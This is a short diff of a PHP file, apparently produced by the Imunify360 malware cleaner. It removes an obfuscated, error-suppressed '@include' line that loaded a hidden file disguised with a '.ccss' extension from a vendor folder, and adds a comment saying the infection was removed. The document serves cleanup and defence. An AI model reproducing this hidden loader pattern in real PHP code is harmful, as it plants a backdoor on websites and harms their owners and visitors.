@@ -1,7 +1,13 @@
 <?php
 /*e94b5*/
 
-@include /*rs*/("/home/r10w01h0ujkt/go\x70lasticfree.in/ongc/vendor/\x70har\x2dio/.0ab6657b.ccss");
+
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code have been removed, and the file is now safe to use.
+* Feel free to contact Imunify support team at https://www.imunify360.com/support/new
+*/
+
 
 /*e94b5*/
 
